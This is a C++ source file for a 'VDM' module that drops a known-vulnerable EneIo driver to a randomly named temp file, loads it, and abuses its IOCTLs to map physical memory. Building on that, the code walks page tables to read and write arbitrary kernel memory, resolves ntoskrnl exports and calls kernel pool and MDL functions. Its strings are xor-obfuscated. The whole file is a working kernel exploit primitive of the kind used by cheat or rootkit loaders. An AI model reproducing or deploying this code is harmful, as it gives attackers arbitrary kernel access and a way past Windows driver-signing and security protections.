#include "VDM.hpp"

#define PAGE_OFFSET_SIZE 12

typedef struct _WINIO_PHYS_MEM
{
	DWORD_PTR Size;
	DWORD_PTR Addr;
	HANDLE hSection;
	PVOID SectionAddr;
	PVOID ObjectAddr;
} WINIO_PHYS_MEM, * PWINIO_PHYS_MEM;

HANDLE VDM::hDriver = NULL;
DWORD_PTR VDM::m_pPML4Base = NULL;

uint64_t VDM::g_KernelBase = NULL;

static const ULONG64 PMASK = (~0xfull << 8) & 0xfffffffffull;

int GetRandomInteger()
{
	std::random_device RANDOM;
	std::mt19937_64 RANDOM_ENGINE(RANDOM());

	std::uniform_int_distribution<int> DISTRIBUTION(5, 13);

	return DISTRIBUTION(RANDOM_ENGINE);
}

std::string GetRandomString(size_t length)
{
	const std::string ALPHA_BET = xor ("qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM");

	std::random_device RANDOM;
	std::default_random_engine RANDOM_ENGINE(RANDOM());
	std::uniform_int_distribution<size_t> DISTRIBUTION(0, ALPHA_BET.size() - 1);

	std::string output;

	while (output.size() < length)
		output += ALPHA_BET[DISTRIBUTION(RANDOM_ENGINE)];

	return output;
}

bool VDM::Init(HANDLE hDevice)
{
	hDriver = hDevice;
	g_KernelBase = GetKernelModule(xor ("ntoskrnl.exe"));

	return hDriver != nullptr && hDriver != INVALID_HANDLE_VALUE && g_KernelBase != NULL;
}

bool VDM::IsLoaded()
{
	auto deviceName = xorstr("\\\\.\\Global\\EneIo");

	hDriver = CreateFileA(deviceName.crypt_get(), FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

	deviceName.crypt();

	if (hDriver != nullptr && hDriver != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hDriver);
		return true;
	}

	return false;
}

std::pair<HANDLE, std::string> VDM::Load(std::vector<std::uint8_t>& driverBuffer)
{
	const auto driverName = GetRandomString(GetRandomInteger());
	const auto driverPath = std::filesystem::temp_directory_path().string() + driverName;

	std::ofstream driverStream(driverPath.c_str(), std::ios::binary);

	driverStream.write((char*)driverBuffer.data(), driverBuffer.size());
	driverStream.close();

	if (!LoadUp::LoadVulnerable(driverPath, driverName))
	{
		printf(xor ("\n[Zalupa] Failed to start vdm.\n"));
		std::remove(driverPath.c_str());

		return { nullptr, "" };
	}

	auto deviceName = xorstr("\\\\.\\Global\\EneIo");

	HANDLE hDriver = CreateFileA(deviceName.crypt_get(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	deviceName.crypt();

	return { hDriver, driverName };
}

bool VDM::Unload(std::string driverName)
{
	if (driverName.empty())
		return false;

	if (hDriver && hDriver != INVALID_HANDLE_VALUE)
		CloseHandle(hDriver);

	if (!LoadUp::UnloadVulnerable(driverName))
	{
		printf(xor ("\n[Zalupa] Failed to unload vdm.\n"));

		return false;
	}

	return true;
}

bool VDM::InitPageTableBase()
{
	auto pData = reinterpret_cast<PUCHAR>(malloc(0x1000));

	if (!pData)
		return false;

	bool bStatus = false;

	ULONG Cr3Offset = ULONG(FIELD_OFFSET(PROCESSOR_START_BLOCK, ProcessorState) + FIELD_OFFSET(KSPECIAL_REGISTERS, Cr3));

	for (DWORD_PTR PageAddress = 0; PageAddress < 0x100000; PageAddress += 0x1000)
	{
		if (ReadPhysicalMemory(PageAddress, 0x1000, pData))
		{
			if (0x00000001000600E9 != (0xffffffffffff00FF & *(UINT64*)(pData)))
				continue;

			if (0xFFFFF80000000000 != (0xfffff80000000003 & *(UINT64*)(pData + FIELD_OFFSET(PROCESSOR_START_BLOCK, LmTarget))))
				continue;

			if (0xffffff0000000fff & *(UINT64*)(pData + Cr3Offset))
				continue;

			m_pPML4Base = *(UINT64*)(pData + Cr3Offset);

			bStatus = true;

			break;
		}
		else
		{
			break;
		}
	}

	free(pData);

	return bStatus;
}

ULONG64 VDM::TranslateLinearAddress(ULONG64 VirtualAddress)
{
	m_pPML4Base &= ~0xF;
	
	ULONG64 PageOffset = VirtualAddress & ~(~0ul << PAGE_OFFSET_SIZE);

	ULONG64 PteOffset = ((VirtualAddress >> 12) & (0x1ffll));
	ULONG64 PtOffset = ((VirtualAddress >> 21) & (0x1ffll));
	ULONG64 PdOffset = ((VirtualAddress >> 30) & (0x1ffll));
	ULONG64 PdpOffset = ((VirtualAddress >> 39) & (0x1ffll));

	ULONG64 PDPE = 0;
	if (!ReadPhysicalMemory((ULONG64)(m_pPML4Base + 8 * PdpOffset), sizeof(PDPE), &PDPE) || ~PDPE & 1)
		return 0;

	ULONG64 PDE = 0;
	if (!ReadPhysicalMemory((ULONG64)((PDPE & PMASK) + 8 * PdOffset), sizeof(PDE), &PDE) || ~PDE & 1)
		return 0;

	if (PDE & 0x80)
		return (PDE & (~0ull << 42 >> 12)) + (VirtualAddress & ~(~0ull << 30));

	ULONG64 PTE = 0;
	if (!ReadPhysicalMemory((ULONG64)((PDE & PMASK) + 8 * PtOffset), sizeof(PTE), &PTE) || ~PTE & 1)
		return 0;

	if (PTE & 0x80)
		return (PTE & PMASK) + (VirtualAddress & ~(~0ull << 21));

	VirtualAddress = 0;
	if (!ReadPhysicalMemory((ULONG64)((PTE & PMASK) + 8 * PteOffset), sizeof(VirtualAddress), &VirtualAddress))
		return 0;

	VirtualAddress &= PMASK;
	if (!VirtualAddress)
		return 0;

	return VirtualAddress + PageOffset;
}

NTSTATUS VDM::MapPhysicalMemory(uint64_t address, uint64_t size, HANDLE* phSection, PVOID* pSectionAddr, PVOID* pObjectAddr)
{
	WINIO_PHYS_MEM Request{};

	Request.Size = size;
	Request.Addr = address;

	DWORD dwSize = 0;

	if (DeviceIoControl(hDriver, 0x80102040, &Request, sizeof(Request), &Request, sizeof(Request), &dwSize, nullptr))
	{
		*phSection = Request.hSection;
		*pObjectAddr = Request.ObjectAddr;
		*pSectionAddr = Request.SectionAddr;

		return STATUS_SUCCESS;
	}

	return STATUS_UNSUCCESSFUL;
}

NTSTATUS VDM::UnMapPhysicalMemory(HANDLE hSection, void* sectionAddress, void* objectAddress)
{
	WINIO_PHYS_MEM Request{};

	Request.hSection = hSection;
	Request.SectionAddr = sectionAddress;
	Request.ObjectAddr = objectAddress;

	DWORD dwSize = 0;

	if (DeviceIoControl(hDriver, 0x80102044, &Request, sizeof(Request), &Request, sizeof(Request), &dwSize, nullptr))
		return STATUS_SUCCESS;

	return STATUS_UNSUCCESSFUL;
}

bool VDM::ReadPhysicalMemory(uint64_t address, uint64_t size, void* Data)
{
	HANDLE hSection = NULL;
	PVOID SectionAddr = nullptr, ObjectAddr = nullptr;

	if (!NT_SUCCESS(MapPhysicalMemory(address, size, &hSection, &SectionAddr, &ObjectAddr)))
		return false;

	bool bStatus = false;

	__try
	{
		bStatus = memcpy(Data, SectionAddr, size) != nullptr;
	}
	__finally
	{
		UnMapPhysicalMemory(hSection, SectionAddr, ObjectAddr);
	}

	return bStatus;
}

bool VDM::WritePhysicalMemory(uint64_t address, uint64_t size, void* Data)
{
	HANDLE hSection = NULL;
	PVOID SectionAddr = nullptr, ObjectAddr = nullptr;

	if (!NT_SUCCESS(MapPhysicalMemory(address, size, &hSection, &SectionAddr, &ObjectAddr)))
		return false;

	bool bStatus = false;

	__try
	{
		bStatus = memcpy(SectionAddr, Data, size) != nullptr;
	}
	__finally
	{
		UnMapPhysicalMemory(hSection, SectionAddr, ObjectAddr);
	}

	return bStatus;
}

bool VDM::ReadVirtualMemory(uint64_t address, void* buffer, uint64_t size)
{
	auto PhysicalAddress = TranslateLinearAddress((ULONG64)address);
	
	if (PhysicalAddress)
	{
		if (ReadPhysicalMemory(PhysicalAddress, size, buffer))
			return true;
	}

	return false;
}

bool VDM::WriteVirtualMemory(uint64_t address, void* buffer, uint64_t size)
{
	auto PhysicalAddress = TranslateLinearAddress((ULONG64)address);
	
	if (PhysicalAddress)
	{
		if (WritePhysicalMemory(PhysicalAddress, size, buffer))
			return true;
	}

	return false;
}

bool VDM::MemCopy(void* address, const void* buffer, size_t size)
{
	static auto pMemcpy = GetKernelProcAddress(g_KernelBase, xor ("memcpy"));

	if (!pMemcpy)
	{
		printf(xor ("\n[Zalupa] Error: memcpy not found.\n"));

		return 0;
	}

	void* pRet = NULL;

	if (!SystemCall(pMemcpy, &pRet, address, buffer, size))
		return 0;

	return true;
}

bool VDM::SetMemory(uint64_t address, uint32_t value, uint64_t size)
{
	if (!address || !size)
		return false;

	static auto pMemset = GetKernelProcAddress(g_KernelBase, xor ("memset"));

	if (!pMemset)
	{
		printf(xor ("\n[Zalupa] Error: memset not found.\n"));

		return 0;
	}

	void* pRet = NULL;

	if (!SystemCall(pMemset, &pRet, address, value, size))
		return 0;

	return true;
}

bool VDM::ReadMemory(uint64_t address, void* buffer, uint64_t size)
{
	return MemCopy(reinterpret_cast<void*>(buffer), (void*)address, size);
}

bool VDM::WriteMemory(uint64_t address, void* buffer, uint64_t size)
{
	return MemCopy((void*)address, reinterpret_cast<void*>(buffer), size);
}

uint64_t VDM::ExAllocatePool(ntspace::POOL_TYPE pool_type, uint64_t size)
{
	if (!size)
		return 0;

	static auto pExAllocatePool = GetKernelProcAddress(g_KernelBase, xor ("ExAllocatePoolWithTag"));

	if (!pExAllocatePool)
	{
		printf(xor ("\n[Zalupa] Error: ExAllocatePool not found.\n"));

		return 0;
	}

	uint64_t pool = 0;

	if (!SystemCall(pExAllocatePool, &pool, pool_type, size, VDM_POOL_TAG))
		return 0;

	return pool;
}

bool VDM::ExFreePool(uint64_t address)
{
	if (!address)
		return 0;

	static auto pExFreePool = GetKernelProcAddress(g_KernelBase, xor ("ExFreePool"));

	if (!pExFreePool)
	{
		printf(xor ("\n[Zalupa] Error: ExFreePool not found.\n"));

		return 0;
	}

	return SystemCall<void>(pExFreePool, nullptr, address);
}

uint64_t VDM::MmAllocatePagesForMdl(LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes)
{
	static auto pMmAllocatePagesForMdl = GetKernelProcAddress(g_KernelBase, xor ("MmAllocatePagesForMdl"));

	if (!pMmAllocatePagesForMdl)
		return 0;

	uint64_t allocatedPage = 0;

	if (!SystemCall(pMmAllocatePagesForMdl, &allocatedPage, LowAddress, HighAddress, SkipBytes, TotalBytes))
		return 0;

	return allocatedPage;
}

uint64_t VDM::MmMapLockedPagesSpecifyCache(uint64_t pmdl, KPROCESSOR_MODE AccessMode, MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority)
{
	static auto pMmMapLockedPagesSpecifyCache = GetKernelProcAddress(g_KernelBase, xor ("MmMapLockedPagesSpecifyCache"));

	if (!pMmMapLockedPagesSpecifyCache)
		return 0;

	uint64_t startAddress = 0;

	if (!SystemCall(pMmMapLockedPagesSpecifyCache, &startAddress, pmdl, AccessMode, CacheType, RequestedAddress, BugCheckOnFailure, Priority))
		return 0;

	return startAddress;
}

bool VDM::MmProtectMdlSystemAddress(uint64_t MemoryDescriptorList, ULONG NewProtect)
{
	static auto pMmProtectMdlSystemAddress = GetKernelProcAddress(g_KernelBase, xor ("MmProtectMdlSystemAddress"));

	if (!pMmProtectMdlSystemAddress)
		return 0;

	NTSTATUS status;

	if (!SystemCall(pMmProtectMdlSystemAddress, &status, MemoryDescriptorList, NewProtect))
		return 0;

	return NT_SUCCESS(status);
}

bool VDM::MmUnmapLockedPages(uint64_t BaseAddress, uint64_t pmdl)
{
	static auto pMmUnmapLockedPages = GetKernelProcAddress(g_KernelBase, xor ("MmUnmapLockedPages"));

	if (!pMmUnmapLockedPages)
		return 0;

	void* pRet;
	return SystemCall(pMmUnmapLockedPages, &pRet, BaseAddress, pmdl);
}

bool VDM::MmFreePagesFromMdl(uint64_t MemoryDescriptorList)
{
	static auto pMmFreePagesFromMdl = GetKernelProcAddress(g_KernelBase, xor ("MmFreePagesFromMdl"));

	if (!pMmFreePagesFromMdl)
		return 0;

	void* pRet;
	return SystemCall(pMmFreePagesFromMdl, &pRet, MemoryDescriptorList);
}

uint64_t VDM::GetKernelProcAddress(uint64_t moduleBase, std::string funcName)
{
	if (!moduleBase)
		return 0;

	IMAGE_DOS_HEADER dosHeader = { 0 };
	if (!ReadVirtualMemory(moduleBase, &dosHeader, sizeof(dosHeader)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
		return 0;

	IMAGE_NT_HEADERS64 ntHeader = { 0 };
	if (!ReadVirtualMemory(moduleBase + dosHeader.e_lfanew, &ntHeader, sizeof(ntHeader)) || ntHeader.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto exportEntry = ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto exportEntrySize = ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!exportEntry || !exportEntrySize)
		return 0;

	const auto pExportDir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, exportEntrySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadVirtualMemory(moduleBase + exportEntry, pExportDir, exportEntrySize))
	{
		VirtualFree(pExportDir, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(pExportDir) - exportEntry;
	const auto currentNameRVA = reinterpret_cast<uint32_t*>(pExportDir->AddressOfNames + delta);

	for (auto i = 0u; i < pExportDir->NumberOfNames; ++i)
	{
		const std::string exportNmae = std::string(reinterpret_cast<char*>(currentNameRVA[i] + delta));

		if (!_stricmp(exportNmae.c_str(), funcName.c_str()))
		{
			const auto ordinal = reinterpret_cast<uint16_t*>(pExportDir->AddressOfNameOrdinals + delta);
			const auto rva = reinterpret_cast<uint32_t*>(pExportDir->AddressOfFunctions + delta);

			const auto funcOrdinal = ordinal[i];
			const auto funcAddress = moduleBase + rva[funcOrdinal];

			if (funcAddress >= moduleBase + exportEntry && funcAddress <= moduleBase + exportEntry + exportEntrySize)
			{
				VirtualFree(pExportDir, 0, MEM_RELEASE);
				return 0;
			}

			VirtualFree(pExportDir, 0, MEM_RELEASE);

			return funcAddress;
		}
	}

	VirtualFree(pExportDir, 0, MEM_RELEASE);

	return 0;
}

